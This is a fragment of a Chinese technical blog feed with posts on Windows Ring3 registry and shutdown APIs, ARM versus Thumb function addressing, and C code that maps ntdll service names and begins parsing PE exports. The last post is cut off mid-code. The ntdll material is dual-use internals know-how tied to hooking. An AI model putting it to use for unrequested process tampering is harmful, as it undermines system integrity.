id="注册表管理"><a href="#注册表管理" class="headerlink" title="注册表管理"></a>注册表管理</h1><h2 id="客户端-7"><a href="#客户端-7" class="headerlink" title="客户端"></a>客户端</h2><p>全给注释了，啥也没做。其实建立好通信，就和服务端的操作一样了。</p><h2 id="服务端-7"><a href="#服务端-7" class="headerlink" title="服务端"></a>服务端</h2><ol><li>LoadLibrary(“Register.dll”);，以下函数都用这个做ModuleBase调用GetProcAddress</li><li>SeEnumRegisterDirList遍历注册表目录。解析HKEY_CLASSES_ROOT、HKEY_CURRENT_USER、HKEY_LOCAL_MACHINE、HKEY_USERS、HKEY_CURRENT_CONFIG等等目录</li><li>SeEnumRegisterItemList遍历注册表Item，列出名称，类型，数据。分开REG_SZ，REG_DWORD，REG_QWORD，REG_BINARY，REG_EXPAND_SZ</li><li>后续没有啥删除，修改的操作。。。</li></ol><h1 id="内核管理"><a href="#内核管理" class="headerlink" title="内核管理"></a>内核管理</h1><p>只有客户端有</p><h2 id="客户端-8"><a href="#客户端-8" class="headerlink" title="客户端"></a>客户端</h2><ol><li>LoadLibraryA(“Ntdll.DLL”)</li><li>GetProcAddress拿到ZwShutdownSystem关机。需要提权到关机权限，OpenProcessToken拿Token然后AdjustTokenPrivileges权限那一套，或者EnableSeDebugPrivilege</li><li>负责和服务端通信。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用Windows-API在Ring3对系统进行操作&quot;&gt;&lt;a href=&quot;#使用Windows-API在Ring3对系统进行操作&quot; class=&quot;headerlink&quot; title=&quot;使用Windows API在Ring3对系统进行操作&quot;&gt;&lt;/a&gt;使用Window</summary>
      
    
    
    
    <category term="Windows Programming" scheme="https://qianmuoy.github.io/categories/Windows-Programming/"/>
    
    
  </entry>
  
  <entry>
    <title>arm和thumb</title>
    <link href="https://qianmuoy.github.io/2024/03/18/arm%E5%92%8Cthumb/"/>
    <id>https://qianmuoy.github.io/2024/03/18/arm%E5%92%8Cthumb/</id>
    <published>2024-03-18T14:20:58.000Z</published>
    <updated>2024-03-18T14:21:32.779Z</updated>
    
    <content type="html"><![CDATA[<h1 id="arm和thumb"><a href="#arm和thumb" class="headerlink" title="arm和thumb"></a>arm和thumb</h1><p><strong>为什么逆向的时候计算thumb地址是so 基址 + 函数在 so 中的偏移 + 1？</strong></p><p><a href="https://blog.csdn.net/tq384998430/article/details/119715531">【ARM】Thumb2指令集中函数的地址不对齐？_thumb 地址-CSDN博客</a></p><p>ARM指令集：</p><p>编代码全部是 32bits 的，每条指令能承载更多的信息，因此使用最少的指令完成功能， 所以在相同频率下运行速度也是最快的， 但也因为每条指令是32bits 的而占用了最多的程序空间。</p><p>Thumb指令集：</p><p>编代码全部是 16bits 的，每条指令所能承载的信息少，因此它需要使用更多的指令才能完成功能， 因此运行速度慢， 但它也占用了最少的程序空间</p><p>Thumb-2指令集：</p><p>在前面两者之间取了一个平衡， 兼有二者的优势， 当一个 操作可以使用一条 32bits指令完成时就使用 32bits 的指令， 加快运行速度， 而当一次操作只需要一条16bits 指令完成时就使用16bits 的指令，节约存储空间。</p><p>实验程序：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span> (*p)(USART_TypeDef*,u8))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">Initialization</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.8X\r\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)main);</span><br><span class="line"> </span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = (<span class="type">unsigned</span> <span class="type">int</span>)test;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.8X\r\n&quot;</span>, a);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ARM指令是4字节对齐的，Thumb-2指令是2字节对齐的，所以这里函数test的地址应该是2字节对齐的，但是打印出来的值却是：080014A9和080014FD。main函数的地址和test函数的地址都成了奇数地址了。</p><p>这个问题在于有些ARM处理器即能使用ARM指令，又能兼容Thumb指令，同一个应用程序中可能同时存在ARM指令和Thumb指令，这两者的处理方式肯定是大不相同的，所以为了切换ARM状态和Thumb状态，在跳转到Thumb指令编写的代码块的时候，将程序地址的最低位置1（因为不管是ARM指令还是Thumb指令，<strong>都至少是2字节对齐的，所以最低位一定是0，所以最低位可以拿来用于区分ARM状态和Thumb状态</strong>），这样处理器识别到最低位为1的话就会切换到Thumb状态，否则则是ARM状态。Thumb2指令集也是为了兼容以前的ARM状态和Thumb状态这样做的。</p><p>所以编译器编译STM32F1的程序的时候，会把函数的真实地址 <strong>加上1</strong> 作为常量放在ROM空间（如果这个函数的地址有被用到的话），获取函数的指针的时候就会获取到最低位被置1的一个地址。如下图，获取test的地址的时候，到0x080014F0地址处读取到了0x080014FD的值，这其实就是test的真实地址0x080014FC + 1得到的。</p><p>同样使用BX指令跳转时，+1就可以在.code16下继续执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;arm和thumb&quot;&gt;&lt;a href=&quot;#arm和thumb&quot; class=&quot;headerlink&quot; title=&quot;arm和thumb&quot;&gt;&lt;/a&gt;arm和thumb&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;为什么逆向的时候计算thumb地址是so 基址 + 函数在 so 中</summary>
      
    
    
    
    <category term="Android" scheme="https://qianmuoy.github.io/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>获取Ntdll函数与NtOS服务信息</title>
    <link href="https://qianmuoy.github.io/2024/03/09/%E8%8E%B7%E5%8F%96Ntdll%E5%87%BD%E6%95%B0%E4%B8%8ENtOS%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF/"/>
    <id>https://qianmuoy.github.io/2024/03/09/%E8%8E%B7%E5%8F%96Ntdll%E5%87%BD%E6%95%B0%E4%B8%8ENtOS%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF/</id>
    <published>2024-03-09T13:09:29.000Z</published>
    <updated>2024-03-09T13:10:01.740Z</updated>
    
    <content type="html"><![CDATA[<h1 id="获取Ntdll常用服务信息和Ntos服务信息"><a href="#获取Ntdll常用服务信息和Ntos服务信息" class="headerlink" title="获取Ntdll常用服务信息和Ntos服务信息"></a>获取Ntdll常用服务信息和Ntos服务信息</h1><h2 id="Ntdll"><a href="#Ntdll" class="headerlink" title="Ntdll"></a>Ntdll</h2><p>公式 写好枚举等结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">    ZW_CREATE_THREAD = <span class="number">0</span>,</span><br><span class="line">    ZW_CREATE_THREAD_EX,</span><br><span class="line">    ZW_SUSPEND_THREAD,</span><br><span class="line">    ZW_SUSPEND_PROCESS,</span><br><span class="line">    ZW_PROTECT_VIRTUAL_MEMORY,</span><br><span class="line">    ZW_SHUTDOWN_SYSTEM,</span><br><span class="line">    ZW_TERMINATE_THREAD,</span><br><span class="line">    ZW_SET_CONTEXT_THREAD,</span><br><span class="line">    ZW_TERMINATE_JOB_OBJECT,</span><br><span class="line">    ZW_SYSTEM_DEBUG_CONTROL,</span><br><span class="line">    ZW_CREATE_USER_PROCESS,</span><br><span class="line">    ZW_DEBUG_ACTIVE_PROCESS,</span><br><span class="line">    ZW_SET_SYSTEM_POWER_STATE,</span><br><span class="line">    ZW_INITIATE_POWER_ACTION,</span><br><span class="line">    ZW_QUEUE_APC_THREAD,</span><br><span class="line">    ZW_QUERY_INFORMATION_THREAD,</span><br><span class="line">    ZW_QUERY_INFORMATION_JOB_OBJECT,</span><br><span class="line">    ZW_READ_VIRTUAL_MEMORY,</span><br><span class="line">    ZW_WRITE_VIRTUAL_MEMORY,</span><br><span class="line">    ZW_TERMINATE_PROCESS,</span><br><span class="line">    ZW_CREATE_SECTION,</span><br><span class="line">    ZW_CREATE_PROCESS_EX,</span><br><span class="line">    ZW_CREATE_PAGING_FILE,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// REG</span></span><br><span class="line">    ZW_OPEN_KEY,</span><br><span class="line">    ZW_CREATE_KEY,</span><br><span class="line">    ZW_DELETE_KEY,</span><br><span class="line">    ZW_DELETE_VALUE_KEY,</span><br><span class="line">    ZW_SET_VALUE_KEY,</span><br><span class="line">    ZW_QUERY_VALUE_KEY,</span><br><span class="line">    ZW_ENUMERATE_VALUE_KEY,</span><br><span class="line">    ZW_ENUMERATE_KEY,</span><br><span class="line">    ZW_QUERY_KEY,</span><br><span class="line">    ZW_CLOSE_HANDLE,</span><br><span class="line">    ZW_OPEN_KEY_EX,</span><br><span class="line">    ZW_RENAME_KEY,</span><br><span class="line">    ZW_RESTORE_KEY,</span><br><span class="line">    ZW_SET_SECURITY_OBJECT,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SYS</span></span><br><span class="line">    ZW_WRITE_FILE,</span><br><span class="line">    ZW_OPEN_SECTION,</span><br><span class="line">    ZW_LOAD_DRIVER,</span><br><span class="line">    ZW_SET_SYSTEM_INFORMATION,</span><br><span class="line">    ZW_REQUEST_WAIT_REPLY_PORT,</span><br><span class="line">    ZW_SET_SYSTEM_TIME,</span><br><span class="line">    ZW_DEVICE_IO_CONTROL_FILE,</span><br><span class="line">    ZW_REPLY_PORT,</span><br><span class="line">    ZW_UNMAP_VIEWOFSECTION,</span><br><span class="line">    ZW_FREE_VIRTUAL_MEMORY,</span><br><span class="line">    ZW_ALPC_SEND_WAIT_RECEIVE_PORT,</span><br><span class="line">    ZW_RAISE_HARD_ERROR,</span><br><span class="line">    ZW_FS_CONTROL_FILE,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PSMON </span></span><br><span class="line">    ZW_TEST_ALERT,</span><br><span class="line">    ZW_OPEN_PROCESS,</span><br><span class="line">    ZW_SET_INFORMATION_PROCESS,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// time</span></span><br><span class="line">    ZW_SET_TIMER,</span><br><span class="line">    ZW_QUERY_VIRTUAL_MEMORY,</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&lt; FOR HOOK</span></span><br><span class="line">    ZW_DISPLAY_STRING,</span><br><span class="line">    </span><br><span class="line">    NT_DLL_INFOS,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID ServiceAddress;</span><br><span class="line">    <span class="type">char</span>* ServiceName;</span><br><span class="line">&#125;NTDLL_INFO;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> NTDLL_INFO __NtdllInfos[NT_DLL_INFOS];</span><br></pre></td></tr></table></figure><p>写好函数名称</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitializeNtdllModule</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    ULONG NumberOfServices = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;__NtdllInfos, <span class="number">0</span>, <span class="built_in">sizeof</span>(__NtdllInfos));</span><br><span class="line"></span><br><span class="line">   __NtdllInfos[ZW_CREATE_THREAD].ServiceName = <span class="string">&quot;NtCreateThread&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SUSPEND_THREAD].ServiceName = <span class="string">&quot;NtSuspendThread&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SUSPEND_PROCESS].ServiceName = <span class="string">&quot;NtSuspendProcess&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_PROTECT_VIRTUAL_MEMORY].ServiceName = <span class="string">&quot;NtProtectVirtualMemory&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SHUTDOWN_SYSTEM].ServiceName = <span class="string">&quot;NtShutdownSystem&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_TERMINATE_THREAD].ServiceName = <span class="string">&quot;NtTerminateThread&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SET_CONTEXT_THREAD].ServiceName = <span class="string">&quot;NtSetContextThread&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_TERMINATE_JOB_OBJECT].ServiceName = <span class="string">&quot;NtTerminateJobObject&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SYSTEM_DEBUG_CONTROL].ServiceName = <span class="string">&quot;NtSystemDebugControl&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_DEBUG_ACTIVE_PROCESS].ServiceName = <span class="string">&quot;NtDebugActiveProcess&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SET_SYSTEM_POWER_STATE].ServiceName = <span class="string">&quot;NtSetSystemPowerState&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_INITIATE_POWER_ACTION].ServiceName = <span class="string">&quot;NtInitiatePowerAction&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_QUEUE_APC_THREAD].ServiceName = <span class="string">&quot;NtQueueApcThread&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_QUERY_INFORMATION_THREAD].ServiceName = <span class="string">&quot;NtQueryInformationThread&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_QUERY_INFORMATION_JOB_OBJECT].ServiceName = <span class="string">&quot;NtQueryInformationJobObject&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_READ_VIRTUAL_MEMORY].ServiceName = <span class="string">&quot;NtReadVirtualMemory&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_WRITE_VIRTUAL_MEMORY].ServiceName = <span class="string">&quot;NtWriteVirtualMemory&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_TERMINATE_PROCESS].ServiceName = <span class="string">&quot;ZwTerminateProcess&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_CREATE_SECTION].ServiceName = <span class="string">&quot;ZwCreateSection&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_OPEN_PROCESS].ServiceName = <span class="string">&quot;NtOpenProcess&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SET_INFORMATION_PROCESS].ServiceName = <span class="string">&quot;NtSetInformationProcess&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (__OsVersion == WINVISTA_VERSION ||</span><br><span class="line">       __OsVersion == WIN7_VERSION ||</span><br><span class="line">       __OsVersion == WIN8_VERSION ||</span><br><span class="line">       __OsVersion == WIN8_VERSION_1 ||</span><br><span class="line">       __OsVersion == WIN8_VERSION_1_9600 ||</span><br><span class="line">       __OsVersion == WIN10_VERSION_10240)</span><br><span class="line">   &#123;</span><br><span class="line">       __NtdllInfos[ZW_CREATE_THREAD_EX].ServiceName = <span class="string">&quot;NtCreateThreadEx&quot;</span>;</span><br><span class="line">       __NtdllInfos[ZW_CREATE_USER_PROCESS].ServiceName = <span class="string">&quot;NtCreateUserProcess&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   __NtdllInfos[ZW_OPEN_KEY].ServiceName = <span class="string">&quot;ZwOpenKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_CREATE_KEY].ServiceName = <span class="string">&quot;ZwCreateKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_DELETE_KEY].ServiceName = <span class="string">&quot;ZwDeleteKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_DELETE_VALUE_KEY].ServiceName = <span class="string">&quot;ZwDeleteValueKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SET_VALUE_KEY].ServiceName = <span class="string">&quot;ZwSetValueKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_QUERY_VALUE_KEY].ServiceName = <span class="string">&quot;ZwQueryValueKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_ENUMERATE_VALUE_KEY].ServiceName = <span class="string">&quot;ZwEnumerateValueKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_ENUMERATE_KEY].ServiceName = <span class="string">&quot;ZwEnumerateKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_QUERY_KEY].ServiceName = <span class="string">&quot;ZwQueryKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_CLOSE_HANDLE].ServiceName = <span class="string">&quot;ZwClose&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_RENAME_KEY].ServiceName = <span class="string">&quot;ZwRenameKey&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (__OsVersion == WINVISTA_VERSION ||</span><br><span class="line">       __OsVersion == WIN7_VERSION ||</span><br><span class="line">       __OsVersion == WIN8_VERSION ||</span><br><span class="line">       __OsVersion == WIN8_VERSION_1 ||</span><br><span class="line">       __OsVersion == WIN8_VERSION_1_9600 ||</span><br><span class="line">       __OsVersion == WIN10_VERSION_10240)</span><br><span class="line">   &#123;</span><br><span class="line">       __NtdllInfos[ZW_OPEN_KEY_EX].ServiceName = <span class="string">&quot;ZwOpenKeyEx&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// SYS</span></span><br><span class="line">   __NtdllInfos[ZW_WRITE_FILE].ServiceName = <span class="string">&quot;ZwWriteFile&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_OPEN_SECTION].ServiceName = <span class="string">&quot;ZwOpenSection&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_LOAD_DRIVER].ServiceName = <span class="string">&quot;ZwLoadDriver&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SET_SYSTEM_INFORMATION].ServiceName = <span class="string">&quot;ZwSetSystemInformation&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_REQUEST_WAIT_REPLY_PORT].ServiceName = <span class="string">&quot;ZwRequestWaitReplyPort&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_SET_SYSTEM_TIME].ServiceName = <span class="string">&quot;ZwSetSystemTime&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_DEVICE_IO_CONTROL_FILE].ServiceName = <span class="string">&quot;ZwDeviceIoControlFile&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_RESTORE_KEY].ServiceName = <span class="string">&quot;ZwRestoreKey&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_REPLY_PORT].ServiceName = <span class="string">&quot;NtReplyPort&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_UNMAP_VIEWOFSECTION].ServiceName = <span class="string">&quot;ZwUnmapViewOfSection&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_FREE_VIRTUAL_MEMORY].ServiceName = <span class="string">&quot;ZwFreeVirtualMemory&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_CREATE_PROCESS_EX].ServiceName = <span class="string">&quot;NtCreateProcessEx&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_RAISE_HARD_ERROR].ServiceName = <span class="string">&quot;NtRaiseHardError&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_FS_CONTROL_FILE].ServiceName = <span class="string">&quot;NtFsControlFile&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (__OsVersion == WINVISTA_VERSION ||</span><br><span class="line">       __OsVersion == WIN7_VERSION ||</span><br><span class="line">       __OsVersion == WIN8_VERSION ||</span><br><span class="line">       __OsVersion == WIN8_VERSION_1 ||</span><br><span class="line">       __OsVersion == WIN8_VERSION_1_9600 ||</span><br><span class="line">       __OsVersion == WIN10_VERSION_10240)</span><br><span class="line">   &#123;</span><br><span class="line">       __NtdllInfos[ZW_ALPC_SEND_WAIT_RECEIVE_PORT].ServiceName = <span class="string">&quot;NtAlpcSendWaitReceivePort&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// PSMON</span></span><br><span class="line">   __NtdllInfos[ZW_TEST_ALERT].ServiceName = <span class="string">&quot;NtTestAlert&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Timer</span></span><br><span class="line">   __NtdllInfos[ZW_SET_TIMER].ServiceName = <span class="string">&quot;NtSetTimer&quot;</span>;</span><br><span class="line">   __NtdllInfos[ZW_QUERY_VIRTUAL_MEMORY].ServiceName = <span class="string">&quot;ZwQueryVirtualMemory&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NT_DLL_INFOS; i++)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">if</span> (__NtdllInfos[i].ServiceName != <span class="literal">NULL</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           NumberOfServices++;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">GetNtServiceAddress</span>(NumberOfServices);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取函数地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetNtServiceAddress</span><span class="params">(ULONG NumberOfServices)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (__OsVersion == WIN10_VERSION_10240)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">GetNtServiceAddressInternal1</span>(NumberOfServices);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">GetNtServiceAddressInternal2</span>(NumberOfServices);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析PE结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetNtServiceAddressInternal1</span><span class="params">(ULONG NumberOfServices)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PVOID v1 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    IMAGE_DOS_HEADER* ImageDosHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32* ImageOptionalHeader32;</span><br><span class="line">    IMAGE_EXPORT_DIRECTORY* ImageExportDirectory;</span><br><span class="line"></span><br><span class="line">    ULONG* AddressOfFunctions;</span><br><span class="line">    ULONG* AddressOfNames;</span><br><span class="line">    USHORT* AddressOfNameOrdinals;</span><br><span class="line">    ULONG Ordinals;</span><br><span class="line">    ULONG i, ServiceAddress;</span><br><span class="line">    <span class="type">char</span>* ServiceName;</span><br><span class="line"></span><br><span class="line">    ULONG j = <span class="number">0</span>;</span><br><span class="line">    ULONG k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = __NtdllImageBase;</span><br><span class="line">        <span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        ImageDosHeader = 